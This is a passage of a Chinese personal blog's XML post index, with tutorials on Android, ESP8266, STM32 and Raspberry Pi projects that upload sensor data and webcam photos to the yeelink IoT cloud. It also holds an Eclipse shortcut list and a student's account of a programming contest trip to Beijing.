大学三年，只因有你们，我的大学生活才不平凡，感恩有你。虽然对这个地方还是有很多的不满，但是自己也在这里成长了三年，再多的抱怨也埋在心底好了。毕竟，我们的成长更多的是靠自己。大四，新的未来。学长学姐都毕业了，我们已经成为最老的老油条，慢慢的自己也获得了成长，但是每一次与学长学姐交流，都可以有新的收获，不管是对未来的一些了解，还是对自己现状的一些反思，我觉得虽然可能就是一次简单的聊天，但也可以对你产生一些无形的影响。最后，祝各位毕业的学长学姐前程似锦，以后有机会再相聚！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android获取yeelink云端数据]]></title>
    <url>%2F2016%2F06%2F29%2FAndroid%E8%8E%B7%E5%8F%96yeelink%E4%BA%91%E7%AB%AF%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[虽然前段时间的项目我参与了硬件部分的调试，但是我主要还是负责Android客户端的开发。yeelink是一个物联网云平台，我们可以采用单片机采集数据，然后将数据上传到yeelink，再通过Android客户端去云端获取数据，以便实现远程监测。这篇博客主要讲解如何从yeelink云端获取单片机上传到yeelink云端的数据。 查阅yeelink开发者文档要想查看云端数据，需使用GET方法，对http://api.yeelink.net/v1.0/device//sensor//datapoint/进行请求，对该URL的请求返回指定key的datapoint, 若未指定key, 则返回该sensor的最新数据。 新建并配置工程添加网络访问权限在AndroidManifest.xml文件中加入如下： 1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; 编写布局文件添加一个Button用于获取数据，添加一个TextView用于显示获取到的数据。 网络请求库android-async-http的使用android-async-http是一个强大的网络请求库，这个网络请求库是基于Apache HttpClient库之上的一个异步网络请求处理库，网络处理均基于Android的非UI线程，通过回调方法处理请求结果。 jar包下载点击此处可以下载jar包 将jar包添加到工程将jar包复制到lib文件夹下，并右键该jar包，BuildPath–Add to Build Path 编写代码新建一个Http工具类CloudHttpUtil,再新建一个静态方法GetCloudData()，该方法需要两个参数，一个是进行消息传递的Handler，另一个是Http请求的url地址，具体代码如下： 12345678910111213141516171819202122232425262728293031public class CloudHttpUtil &#123;public static void GetCloudData(final Handler handler, String url) &#123; AsyncHttpClient client = new AsyncHttpClient(); //添加Http请求的头部信息 client.addHeader(&quot;U-ApiKey&quot;, &quot;你的API密钥&quot;); //使用get方法获取数据 client.get(url, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int i, Header[] headers, byte[] bytes) &#123; // TODO Auto-generated method stub String response = new String(bytes); Message msg = new Message(); msg.obj = response; //请求成功后，将返回值通过消息传递到Activity实现数据显示 handler.sendMessage(msg); &#125; @Override public void onFailure(int i, Header[] headers, byte[] bytes, Throwable throwable) &#123; // TODO Auto-generated method stub String response = new String(bytes); //请求不成功时将错误信息打印 System.out.println(response); &#125; &#125;); &#125;&#125; 获取云端数据123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class MainActivity extends ActionBarActivity &#123; private TextView tv_clound_data; private Button btn_get_data; private Handler cloudHandler = new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; String jsonData = (String) msg.obj; //成功获取数据后，将数据显示在界面上 tv_clound_data.setText(jsonData); //还可以将获得的JSON数据进行解析，以便使用适配器将数据显示在列表等其他地方 JSONArray ja; try &#123; ja = new JSONArray(jsonData); for (int i = 0; i &lt; ja.length(); i++) &#123; JSONObject js = ja.getJSONObject(i); String time = js.getString(&quot;timestamp&quot;); String value = js.getString(&quot;value&quot;); System.out.println(time + value); &#125; &#125; catch (JSONException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //初始化控件 tv_clound_data = (TextView) findViewById(R.id.tv_clound_data); btn_get_data = (Button) findViewById(R.id.btn_get_data); //设置按钮监听事件 btn_get_data.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub //不带参数的请求 //String url = &quot;http://api.yeelink.net/v1.0/device/你的设备号/sensor/你的传感器号/datapoint&quot;; //带参数的请求 String url = &quot;http://api.yeelink.net/v1.0/device/你的设备号/sensor/你的传感器号.json?start=2016-05-01T14:01:46&amp;end=2016-06-24T10:01:40&amp;interval=1&quot;; //发送http请求 CloudHttpUtil.GetCloudData(cloudHandler, url); &#125; &#125;); &#125;&#125; 测试效果图不带参数的请求不带参数时将返回最新一个数据点的数据： 带参数的请求带参数时将返回参数指定时间段内的数据： 注：你的云端传感器得有数据才能获取啊，没有数据的话可以在yeelink官网手动添加几个数据，他的API文档中编辑数据，然后有个在线调试，可以模拟Http请求进行数据点的创建。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单片机+ESP8266上传数据到yeelink]]></title>
    <url>%2F2016%2F06%2F29%2F%E5%8D%95%E7%89%87%E6%9C%BA-ESP8266%E4%B8%8A%E4%BC%A0%E6%95%B0%E6%8D%AE%E5%88%B0yeelink%2F</url>
    <content type="text"><![CDATA[前段时间在做一个物联网的项目，需要将采集到的数据通过STM32单片机传送到yeelink云端，虽然之前学过51单片机但是因为ESP8266也是第一次使用，而且STM32没学过，对底层操作通信协议也不清楚，所以调试了很才成功了，现在有时间就把之前的思路理顺一下，希望对初学者有帮助。 串口直接调试一开始是直接和项目成员一起通过STM32的串口发送命令来控制ESP8266进行数据发送，但是一直没成功，也不知道哪里出错了，也是想到可以直接将ESP8266通过单片机的转串口模块连接到电脑，用电脑的串口助手直接发命令给ESP8266进行调试，这样调试成功之后再把STM32加进来就容易多啦。 熟悉操作命令查阅ESP8266的相关资料，以及yeelink的http请求格式，将命令准备在串口调试助手，如下图： 注意选择发送新行，这样串口助手将自动在每一行后面加上回车换行符，具体原因在后面解释。然后在http请求头最后要发送一个空行，在发送请求体，即数据。否则数据上传失败。 硬件连接与设置此处需要借助一个USB转串口的模块，也可以直接用单片机开发板上的转串口模块，将ESP8266的Txd，Rxd引脚与单片机开发板的串口输出引脚反接(即Txd连Rxd，Rxd连Txd)，将Vcc接单片机开发板的Vcc或5V，GND接开发板的GND，然后在电脑上设置串口调试助手波特率为：11520，再按顺序一条一条的发送以下命令，每条命令都会有相应的回应： ESP8266控制指令（1）设置WIFI模式AT+CWMODE=1 （2）重启生效AT+RST （3）连接无线路由器AT+CWJAP=”你的wifi账号”,”你的wifi密码” （4）查询模块IPAT+CIFSR （5）与服务器建立TCP连接AT+CIPSTART=”TCP”,”www.yeelink.net”,80 （6）开启透传模式AT+CIPMODE=1 （7）开始透传AT+CIPSEND 开始透传之后串口助手将显示‘&gt;’符号，已经开启透传模式，表示可以传输数据，如下图： Http请求格式Http请求的格式可以参照yeelink的API文档中的在线调试，如下图： 在线调试发送Http请求之后下面会显示发送Http请求的格式，可直接复制过来用。 进入透传模式之后开始发送http请求获取数据，将以下8条命令一次发送完成，按顺序将命令一个个点击发送完，不要点一个等一下，这个必须将所有命令发送完才会有回应 （1）POST /v1.0/device/你的设备号/sensor/你的传感器号/datapoints HTTP/1.1 （2）User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 （3）Host: api.yeelink.net （4）Accept: / （5）Content-Length: 15 （6）U-ApiKey: 这里填写你在yeelink申请的密钥 （7）发送一个空行 （8）{“value”:34.66} 发送成功将获得服务器的200，OK返回。 其实，在这个过程中也遇到了很多坑： （1）本来每发一条命令之后都要加上回车换行表示结束的，一开始没注意串口助手已经勾选发送新行，即自动为每一行添加回车换行，于是每条命令之后都有两个回车换行，就悲剧了。一定要注意你是否勾选上串口调试助手的回车换行。 （2）建议大家还是勾选上串口调试助手的发送新行，一方面不用自己去写回车换行符，另一方面也省去了考虑加转义字符的麻烦。亲测，串口助手还不一定可以识别你自己写的回车换行符。 （3）Http请求一定是一次性发送完才会有响应，否则服务器无法判断你的请求是否发送完。 单片机控制ESP8266以上的测试成功以后，应该怎么发送命令，怎么发送Http请求就已经很清楚了，将这些命令和请求嵌入到STM32的代码中，然后用STM32的串口通过printf函数进行输出，便可以很方便的实现我们需要的功能。当然，此时需要注意为每一行命令加上回车换行符，以及转义字符的处理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768//串口3,printf 函数//确保一次发送数据不超过USART3_MAX_SEND_LEN字节void u3_printf(char* fmt,...) &#123; u16 i,j; va_list ap; va_start(ap,fmt); vsprintf((char*)USART3_TX_BUF,fmt,ap); va_end(ap); i=strlen((const char*)USART3_TX_BUF); //此次发送数据的长度 for(j=0;j&lt;i;j++) //循环发送数据 &#123; //循环发送,直到发送完毕 while(USART_GetFlagStatus(USART3,USART_FLAG_TC)==RESET); USART_SendData(USART3,USART3_TX_BUF[j]); &#125; &#125;/*ESP8266连接网络与发送Http请求的部分代码*///设置WIFI模式u3_printf(&quot;AT+CWMODE=1\r\n&quot;);delay_ms(1000);//重启生效u3_printf(&quot;AT+RST\r\n&quot;);delay_ms(1000);//连接无线路由器，需延时等待连接成功u3_printf(&quot;AT+CWJAP=\&quot;你的wifi账号\&quot;,\&quot;你的wifi密码\&quot;\r\n&quot;); delay_ms(1000);delay_ms(1000);delay_ms(1000);delay_ms(1000);delay_ms(1000);delay_ms(1000);//此处省略了查看ip地址//与服务器建立TCP连接u3_printf(&quot;AT+CIPSTART=\&quot;TCP\&quot;,\&quot;www.yeelink.net\&quot;,80\r\n&quot;);delay_ms(1000);delay_ms(1000);//开启透传模式u3_printf(&quot;AT+CIPMODE=1\r\n&quot;);delay_ms(1000);//开始透传u3_printf(&quot;AT+CIPSEND\r\n&quot;);delay_ms(10);//开始发生Http请求u3_printf(&quot;POST /v1.0/device/你的设备号/sensor/你的传感器号/datapoints HTTP/1.1\r\n&quot;);u3_printf(&quot;Host: api.yeelink.net\r\n&quot;);u3_printf(&quot;Accept: */*\r\n&quot;);u3_printf(&quot;U-ApiKey: 你在yeelink申请的密钥\r\n&quot;);u3_printf(&quot;Content-Length: 15\r\n&quot;);//设置短连接，连接双方都会要求在处理请求后关闭它们的TCP连接u3_printf(&quot;Connection: close\r\n&quot;);u3_printf(&quot;\r\n&quot;); //发送数据u3_printf(&quot;&#123;\&quot;value\&quot;:34.66&#125;); delay_ms(1000);//关闭透传u3_printf(&quot;+++&quot;);]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>［单片机,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android开发之eclipse快捷操作]]></title>
    <url>%2F2016%2F06%2F18%2FAndroid%E5%BC%80%E5%8F%91%E4%B9%8Beclipse%E5%BF%AB%E6%8D%B7%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[本文总结了一些eclipse常用的快捷键以及快捷操作的小技巧，熟悉使用这些操作对于提高开发效率将会很有帮助。 eclipse快速注释（1）行注释： ctrl+/ （2）取消行注释： 再按一次ctrl+/ （3）块注释: ctrl+shift+/ （4）取消块注释： ctrl+shift+\ eclipse快速编辑（1）快速删除当前行： ctrl+D （2）代码编辑窗口缩放： ctrl+M，再按一次则可以恢复 （3）快速切换代码编辑窗口： ctrl+F6 （4）大小写切换： Ctrl+Shift+Y 大写变小写 Ctrl+Shift+X 小写变大写 （5）复制行： Ctrl+Alt+向上 复制当前行到上一行 Ctrl+Alt+向下 复制当前行到下一行 （6）移动行： Alt+向下 快速提取某行到下边指定位置 Alt+向上 快速提取某行到上边指定位置 （7）下一个错误及快速修改： Ctrl+.及Ctrl+1 （8）快速跳转到申明： F3 （9）重命名： F2 （10）回到最后一次编辑的地方： ctrl+Q （11）快速查看当前类的方法或某个特定方法： ctrl+O （12）配置行号： 点击菜单栏的Windows—&gt;preference—&gt;General—&gt;Editors—&gt;Text Editors将show line numbers选上 （13）增强代码提示功能： 点击菜单栏的Windows—&gt;preference—&gt;Java—&gt;Editors—&gt;Content Assist将Auto activation atriggers for java后面的“.”换成“abcdefghijklmnopqrstuvwxyz.” 快速生成（1）快速复写超类的方法： 点击右键—&gt;source—&gt;Generate Constructors from Superclass （2）批量生成get、set方法： 点击右键—&gt;source—&gt;Generate Getters and Setters （3）快速生成构造方法： 点击右键—&gt;source—&gt;Generate Constructor using Fields （4）使用代码模板（需选中代码）： Alt+Shift+Z （5）快速导入包： Ctrl+Shift+O （5）快速添加javadoc注释： Ctrl+Shift+J 美化代码（1）快速格式化代码： Ctrl+Shift+F （2）成员排序： 选择菜单栏source—&gt;Sort Members，使变量名、方法名或者类名按首字母大小排序 （3）整理导入的包： 选择菜单栏Source—&gt;Organize Imports 或者使用Ctrl+Shift+O,可以快速导入缺少的包以及删除不需要的包 代码重构(Refactor)快速打开Refactor菜单：Alt+shift+T （1）Rename 选中变量或者方法名等需要更改的名字，点击菜单栏Refactor——&gt;Rename（或者使用快捷键alt+shift+R）即可实现代码中某一变量、方法或者类名进行全部重命名替换 （2）Move 点击菜单栏Refactor—&gt;Move（或者使用快捷键alt+shift+V），将该java文件移动到其他的包 （3）修改方法结构 点击菜单栏Refactor—&gt;Change Method Signature（或者使用快捷键alt+shift+C），不管有多少个函数调用了这个方法，修改一次就能全部搞定 （4）抽取方法 选中需要单独生成方法的代码，点击菜单栏（或者右键）Refactor—&gt;Extract Method（或者使用快捷键alt+shift+M）,这是重构里面最常用的方法之一 （5）抽取本地变量 选中数字或字符串，点击菜单栏（或者右键）Refactor—&gt;Extract Local Variable（或者使用快捷键alt+shift+L）， 可以直接把数字和字符串抽取成一个变量 （6）撤销重构： alt+shift+Z或者ctrl+Z]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,eclipse］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+motion实现局域网简单监控]]></title>
    <url>%2F2016%2F06%2F14%2F%E6%A0%91%E8%8E%93%E6%B4%BE-motion%E5%AE%9E%E7%8E%B0%E5%B1%80%E5%9F%9F%E7%BD%91%E7%AE%80%E5%8D%95%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[检查USB摄像头主要检查摄像头是否被树莓派检测到（同博主上一篇树莓派的博客） 如果没有你的摄像头的信息，那么有可能你的树莓派的电源无法供应足够的电力给你的摄像头。这时你可以给你的摄像头用独立的电源线，比如有源USB hub，并重新输入lsusb命令查看。如果摄像头还是不能被识别，我们只有建议你购买其他树莓派支持的摄像头了。 配置motion注意：本文以Raspbian系统为例 安装motion输入命令： 1sudo apt-get install motion 配置motion daemon 守护进程输入命令编辑motion： 1sudo nano /etc/default/motion 把里面的no修改成yes，让他可以一直在后台运行： 1start_motion_daemon=yes 修改motion的配置文件（1）输入命令 1sudo vim /etc/motion/motion.conf （2）修改配置文件 将第11行的daemon off 改成daemon on，如下图： 该文件很长，需要一直往下翻，直到464行你才看到端口号8081，我们通过这个端口来读取视频数据，这里无需修改！如下图： 然后到第477行将stream_localhost on改成off，即关闭 localhost 的限制，如下图： 当然，你也可以设定图片的分辨率，在第90行进行修改： 最后，vim编辑器下按esc然后输入：wq，即保存退出。 配置启动（1）输入下面命令启动服务： 1sudo service motion start （2）输入以下命令开启motion： 1sudo motion 查看效果打开浏览器，输入http://树莓派IP:8081即可查看拍到的图像，如下图： 需要注意的问题浏览器的问题经过测试，Google浏览器和火狐浏览器可以访问到图像，IE、Microsoft Edge和360都不显示图像，而是提示下载，一直下载，其他的没有测试。 局域网限制之前看到别人的教程写的是外网也可以访问，实际上如果你没有配置你的树莓派成为服务器的话，你的树莓派的ip地址都是私有地址，外网无法访问，只能在局域网内部使用。 摄像头的问题树莓派供电不足也会影响视频质量，就像我上面的视频不是很清楚，我是直接用笔记本的USB供电的，一般来说笔记本USB口电流一般为500mA，所以如果需要视频清晰的话建议使用移动电源进行供电，或者使用有源USB hub。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,监控,motion］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蓝桥杯决赛之行---北京]]></title>
    <url>%2F2016%2F06%2F10%2F%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E4%B9%8B%E8%A1%8C-%E5%8C%97%E4%BA%AC%2F</url>
    <content type="text"><![CDATA[端午节都过去了，和室友出去浪了一天，回来已经很累了，但是突然想到这一篇博客还没有写完，从北京回来也将近10天了，我估计如果再不写以后就不会写了。这段时间断断续续写了一点，但是写着写着又觉得自己在记流水账，然后就不想写下去了，感觉写作能力是越来越差了。但是，我觉得这一篇我必须得完成它，毕竟这次去北京参加蓝桥杯决赛自己收获很多，也有很多可以讲述的故事，这样的总结不管是对自己来说还是对看这篇博客的人来说都会有意义。有兴趣就听我唠叨唠叨吧~ 5月26日晚，怀着对帝都的期待与蓝桥杯决赛的担忧踏上了去往北京的火车。还好是卧铺，睡一晚就可以到北京。蓝桥杯决赛，其实并没有准备多久。现在想起来原因很多，忙碌的五月，似乎好多计划都被打乱，因为软考，因为期中考，还因为很多要去争取的东西，准备比赛的心思也没有了，省赛时大家一起备赛的氛围也没了，实验室被做毕业设计的学长学姐霸占，自己只能在寝室写写代码，积极性并不高。所以，只在最后几天好好复习了一下基本的模块，然后准备了一些资料到火车上看，但是因为是和其他实验室的小伙伴一起去，所以并不好自己一个人看代码，而是听带队老师讲讲故事，和他们一起玩玩，熄灯后就各自睡了，并没有做任何的复习。 5月27日早，到达北京西站，指导老师已经提前订好房间，我们准备坐地铁去住的地方，在地铁站，10几条地铁线路将北京完全覆盖，早高峰地铁排队的场景让我感叹大城市的不易。很幸运的是出了地铁站便看到北京展览馆，而且正好第二十届中国国际软件博览会，指导老师提议要去看一看，领了免费的入场券，然后回宾馆放行李，休整了一会就去看博览会了。 不愧是中国国际软件博览会，我国的各个省都有展区，还有韩国日本的展区。比较大的馆主要还是北上广、成都、南京这些地方的，毕竟产业链比较完善。很多互联网公司都展示了他们的产品，也提供了很多宣传资料。在这次博览会中，我们不仅看到了很多新的科技产品，比如能和人对话的机器人、VR眼镜、无人机等，而且还看到了自己之前了解过的一些项目，之前想过用树莓派去做停车场管理系统，因为在国内树莓派的资源相对较少，而比较成功的例子恰好是北邮的几个学生做的基于树莓派和微信的停车场视频监控系统，在这次展览中也看到好几家公司都有在做停车场管理系统，只是侧重的方面不太相同，也和展台的工作人员有过交流，都还做得比较成功。也看到了做农产品电商的公司，之前自己也弄过一个掌上农资宝的项目，想着去做一个卖农资的安卓App，当时因为自己才刚刚开始学安卓，所以也只是参加了两个比赛，并没有真正去做。在广州馆看到了机智云，一家做物联网云平台的公司，之前根本不知道，因为自己一直用的青岛的一家物联网云平台：yeelink，觉得还挺不错的，这次的发现又让我多了一个选择。在香港馆看到了做儿童编程玩具的，与工作人员交流之中了解到，他们的产品就是用的esp8266无线模块连接手机来进行控制，因为实验室也有这个模块，所以觉得这个东西还挺不错的，值得以后去玩一下。还在安徽馆看到了科大讯飞的展台，因为之前用过科大讯飞的语音SDK，所以感觉很熟悉。总之，这次博览会让我对这个行业有了更多的了解，通过与工作人员交流，我对于这些技术也有了新的认识，也开阔了视野。有些技术能力可能我们已经具备了，只是缺少创新的思想，没有去尝试。 中午带队老师带我们去吃了自助，到北京的第一顿饭，吃的很饱也很爽。下午休息了一下就到北方工业大学去看考场了，在百度地图的指引下一路公交到达考点花了将近两个小时，确实有点远，计划第二天早上要很早起来，然后坐地铁过去，毕竟怕迟到。北方工业大学博远楼是新建不久的大楼，里面的设备都很好，大教室有100堕胎电脑，好几个大的显示屏，很是羡慕，毕竟帝都的学校啊，比我们的条件真的好很多。到赛场熟悉了比赛要使用的电脑之后我们便赶回宾馆与带队老师汇合。吃过晚饭后去了北大，虽然晚上不太看得清，但是还是有几点很不一样的感受，第一是北大的自行车特别多，几乎所有教学楼旁边都停满了自行车，然而在我们学校这样的场景是看不到的，这或许也是一种氛围吧，快节奏的校园生活。第二是课堂氛围好，观察了课堂最后几排的同学，基本没有在玩手机的，都在认真听讲，这和我们学校也是天然之别。第三是北大学生的气质都不一样，特别是女生，有一种肃然起敬的感觉。在未名湖畔，听带队老师给我们介绍北大，也是很不错的经历了。晚上回到宾馆已经10点，突然发现奔波了一天，感觉很累了，但是想到明天的比赛还剩很紧张，本来来北京之前准备了一些资料，准备在火车上或者到宾馆再认真看看，但是一直没有机会。现在终于可以再好好准备一下明天的比赛了，于是又和队友一起认真的写代码，记代码，熟悉自己还不熟练的模块，差不多到12点，累得不行了，就休息了。 5月28日早，因为住的地方离考点：北方工业大学有点远，坐地铁转公交加起来差不多要一个小时，所以我们早早的就出发了，到那里时后到处找卖早餐的地方，很是着急，匆匆吃完早餐就去考场了。一进大楼就有武警保守，突然觉得有点紧张了，排队进场然后抽取座位号，40号，说实话，不太喜欢的一个数字，但是当时也没想太多。找到座位后，我发现很多人已经开始在写代码了，于是我也里面开始建工程，把基本的代码框架搭好，等到老师发布题目时我已经能够让数码管显示数字了，这一点很重要，争取了一点点时间。然后，突然被告知这个机房的Altium Designer由于没有破解，很多电脑都用不了，所以只能用protel99 se，但是我从来都没用过，所以我当时就很慌了，打开protel 99后发现是英文版的，我连元器件都找不到！琢磨了几分钟后我放弃了，决定先把题目要求的功能实现，毕竟电路图只有十分。这次的题目相比省赛的题目难多了，时间一样，但是要求更多，逻辑更复杂。折腾了好一会，遇到不少的问题，发现原本熟悉的矩阵键盘也不灵了，最后赛点老师提示大家由于题目要测555产生的波的频率和周期，占用了P3.4口，所以会影响矩阵键盘，希望大家明白这不是板子的问题，我突然明白了，然后开始根据题目需求改矩阵键盘的检测代码。写着写着，又发现竞赛给的驱动代码也有问题，这个问题是我们在准备省赛的时候就发现了的，当时认真的解决了这个问题，但是我始终坚信竞赛的时候给的驱动代码是不会有问题的，于是决赛的备赛阶段我就没怎么注意这个问题。AD得到的数据一直在跳，到最后也没有稳定下来，但是AD是可以用的。后来发现时间越来越紧了，也是决定改变策略，把思路理清，把基本的界面和功能先实现，更深入的要求如果没时间就不做了。 5月28日下午，比赛就这样结束了，或许一切结束的太快，突然觉得如释重负，又觉得这次要拿奖很悬。仔细想了想，反正明天就出结果，今天得好好玩一玩，然后直接去了天安门城楼。公交转地铁，一路都很顺利，不得不感慨帝都的路面交通经常很堵，但是地铁真的是很方便。天安门城楼和天安门广场到处都有安保，进入天安门区域还有安检。以前只能在电视里看到的地方，现在自己终于有机会亲临现场感受祖国的伟大。4点过3分到达故宫售票点，却发现4点后不再售票，这也许是这次北京之行的一大遗憾了吧。看了中山公园、天安门广场、人民英雄纪念碑、人民大会堂、毛主席纪念堂等，具体的就不在这里一一描述了，感觉已经有点记流水账了。 5月28日晚上，先描述一下行程吧，因为指导老师以前的几个学生在北京工作，听说老师来北京了，特意来请老师吃饭，顺便把我们也带上了，吃完还带我们到鸟巢、水立方、奥林匹克森林公园附近转了转。然后谈谈感想，我是觉得很有幸能够见到几位07级的学长，几位学长以前是农大的，考了北邮、北航这样的学校的研究生，他们现在在阿里、360、百度这样的公司工作，以前都是从实验室出来的，他们都觉得是实验室的老师教会了他们很多，也是在实验室他们得到了很多锻炼。其中有一位学长本科是学经济学的，因为兴趣加入了我们院的ACM实验室，后来考上了北邮的研究生，现在在阿里做搜索方面的工作，这让我很佩服，然后我去看了他的博客，他从11年开始写，一直到现在都还有更新。与几位学长交流了很多，了解到360竟然有专门的爬虫部门，在阿里的学长说我们在大学能够做一个不错的搜索引擎项目就很不错了。交流之中，我也明白了做技术确定比较辛苦，坚持去做一件事情也确实不容易，但是如果能深入下去还是会找到不一样的快乐。 5月29日，长城一日游，也是一次充满故事的旅行吧！未完待续，有时间继续更新继续修改。 因为是第一次去北京，所以本来就很特殊。 特殊到我可以开心好久好久！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+USB摄像头+yeelink实现云监控]]></title>
    <url>%2F2016%2F06%2F10%2F%E6%A0%91%E8%8E%93%E6%B4%BE-USB%E6%91%84%E5%83%8F%E5%A4%B4-yeelink%E5%AE%9E%E7%8E%B0%E4%BA%91%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[配置USB摄像头检查摄像头是否被树莓派检测到输入命令： 1$ lsusb 查看输出信息 如上图我们可以看到camera的信息，如果没有你的摄像头的信息，那么有可能你的树莓派的电源无法供应足够的电力给你的摄像头。这时你可以给你的摄像头用独立的电源线，比如有源USB hub，并重新输入lsusb命令查看。如果摄像头还是不能被识别，我们只有建议你购买其他树莓派支持的摄像头了。 安装fswebcam要想拍摄照片，你要安装fswebcam，这是一款小型摄像头程序。你可以直接通过Raspbian的仓库来安装fswebcam。 输入命令： 1sudo apt-get install fswebcam 配置yeelink云端 到yeelink官网注册一个账号 添加一个新设备,填写基本信息 点击管理设备，然后添加一个传感器 查看API文档 配置shell脚本 创建shell脚本输入命令 1touch yeelink.sh 打开yeelink.sh输入命令： 1nano yeelink.sh 编辑yeelink.sh写入如下两行，然后保存退出： 12sudo fswebcam -d /dev/video0 -r 800x600 --bottom-banner --title &quot;RaspberryPi@Yeelink&quot; --save /home/pi/yeelink.jpgcurl --request POST --data-binary @&quot;/home/pi/yeelink.jpg&quot; --header &quot;U-ApiKey:这里填写你自己的ApiKey&quot; http://api.yeelink.net/v1.0/device/你的设备码/sensor/你的传感器码/photos 为脚本增加可执行权限输入命令： 1chmod +x yeelink.sh 将脚本加入cronjob定时任务输入命令： 1crontab -e 加入下面一行, 让脚本每分钟运行一次,即发送一张图片，然后保存退出 1*/1 * * * * /home/pi/yeelink.sh 至此，我们的项目就完成了，我们可以到yeelink网站上去管理我们的设备，可以看到每隔一分钟会收到一张图片。如下图是我测试时的图片：]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,监控,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单片机设计与开发：前后台系统]]></title>
    <url>%2F2016%2F06%2F03%2F%E5%8D%95%E7%89%87%E6%9C%BA%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BC%80%E5%8F%91%EF%BC%9A%E5%89%8D%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[前后台系统的架构简单来说就是一个大的循环，加上中断，就形成了一个整的体系。如GPIO、定时器、数码管实验等都是前后台系统架构，任务顺序地执行的，而前台指的是中断级，后台指的是main函数里的程序即任务级。 前后台系统又叫作超级大循环系统，这个可以从“while(1)”关键字眼就可以得知。这样的系统比较简单，实时性，并行性要求不太高的情况下是不错的方法，程序设计简单，思路比较清晰。但是当应用程序比较复杂的时候，如果没有一个完整的流程图，恐怕别人很难看懂程序的运行状态，而且随着程序功能的增加，编写应用程序的工程师的大脑也开始混乱。即不利于升级维护，也不利于代码优化。比较复杂一点的应用程序，使用此法虽然能够实现功能，但是自己的思维一直处于混乱状态，导致程序一直不能让自己满意。 这里通过一个简单的例子来说明前后台系统设计的思想，相信很多人平常也这么用过，但是可能并不知道这就是前后台系统的思想。很简单，我们通过单片机来实现一个温度采集并将温度显示在数码管上的小实验。在这里数码管显示就相当于前台，所以display函数放在中断服务函数里，是它能够2ms更新一次数据，然后在主函数通过while(1)循环实现后台任务，即温度采集与数据处理，最终实现温度实时更新。代码框架如下： 123456789101112131415161718192021222324252627282930313233343536void display() //数码管显示函数&#123; ........ //段选 ........ //位选 ........ //消影&#125;void init_timer() //定时器0初始化&#123; TMOD = 0x01; TH0 = (65536-2000)/256; TL0 = (65536-2000)%256; EA = 1; ET0 = 1; TR0 = 1;&#125;void main()&#123; uint temp; uchar adc,num; init_timer(); //定时器初始化 while(1) &#123; ...... //温度采集 ...... //数据处理 &#125;&#125;void timer() interrupt 1 //定时器0中断服务函数&#123; TH0 = (65536-2000)/256; TL0 = (65536-2000)%256; display(); //每2ms显示一次&#125; 当然，前后台系统设计一定要注意一条原则： 紧急的事务一定要用中断处理，中断只处理紧急事务！ 在前后台系统当中，关键的时间操作必须通过中断操作来保证实时性，由于前后台系统中的任务是顺序执行的，中断服务函数提供的信息需要后台程序走到该处理这个信息这一步时才能得到处理的，倘若任务数越多，实时性更加得不到保证，因为循环的执行时间不是常数，程序经过某一特定部分的准确时间也是不能确定的。进而，如果程序修改了，循环的时序也会受到影响。很多基于微处理器的产品采用前后台系统设计，例如微波炉、电话机、玩具等。在另外一些基于微处理器的应用中，从省电的角度出发，平时微处理器处在停机状态(halt)，所有的事都靠中断服务来完成。]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+DHT11温湿度传感器+yeelink物联网云]]></title>
    <url>%2F2016%2F06%2F02%2F%E6%A0%91%E8%8E%93%E6%B4%BE-DHT11%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8-yeelink%E7%89%A9%E8%81%94%E7%BD%91%E4%BA%91%2F</url>
